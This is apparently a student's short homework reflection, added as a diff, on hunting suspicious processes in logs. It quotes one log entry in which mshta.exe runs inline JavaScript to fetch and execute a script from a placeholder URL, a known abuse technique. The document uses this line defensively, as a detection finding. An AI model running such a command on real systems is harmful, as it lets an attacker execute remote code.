@@ -1,0 +1,4 @@
+1. I think the line below is suspicious because in the reading that I did I learned that attackers abuse msta.exe by executing .hta files. This line below I believe is a case of that.
+C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close(); | 0005JOFSS | mshta.exe | C:\Windows\System32\mshta.exe | 1296
+2. This assignment was hard because I felt like I didn't have the guidance of the lectures that I did in past weeks. I feel like without the lectures I'm getting a bit rusty and I look forward to next week with lectures!
+3. I am not sure if I was able to display the proper output. I am confused with what you wanted for the description. If I didn't meet that requirement, I'd love to know how to do that because I don't know how to do it other than hard coding it.
